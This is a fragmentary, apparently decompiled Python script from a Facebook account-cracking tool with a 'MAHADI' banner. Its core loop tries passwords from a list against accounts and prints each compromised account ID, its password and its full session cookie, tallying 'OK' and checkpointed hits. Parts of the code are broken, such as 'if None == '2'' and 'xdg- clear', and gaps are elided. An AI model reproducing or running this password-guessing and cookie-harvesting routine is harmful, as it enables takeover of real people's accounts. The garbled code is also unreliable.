...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://facebook.com/groups/364932411740947/')
        FD()
        return None
...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/mahadihasanjihad009')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
today = date.today()
logo =                                          ("""   
\033[1;32m __  __          _    _          _____ _____  
\033[1;32 |  \/  |   /\   | |  | |   /\   |  __ \_   _| 
\033[1;32 | \  / |  /  \  | |__| |  /  \  | |  | || |  
\033[1;32  | |\/| | / /\ \ |  __  | / /\ \ | |  | || | 
\033[1;32 | |  | |/ ____ \| |  | |/ ____ \| |__| || |_  
 \033[1;32  |_|  |_/_/    \_\_|  |_/_/    \_\_____/_____|                
\033[1;32m================= \33[32mMAHADI\33[0;37m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMH JIHAD
\033[1;32m     \033[1;32mFACEBOK      : \033[1;32m MAHADI HASAN JIHAD
\033[1;32m     \033[1;33mGITHUB       :  \033[1;31m MAHADI099
\033[1;32m     \033[1;34mTOOL STATUS  :  \033[1;35mTOOL IS FREE
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 3.1
\033[1;37m~~~~~~~~~~~~~ \33[32;45mYA\33[0;m **************
 
       \33[37;41m\t WELLCOME TO TOOLS\33[0;m
 
\033[1;37m================== \33[32;45mMAHADI\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[1;32m(MAHADI -OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('    \33[1;30m(MAHADI -CPl•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[MAHADI ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
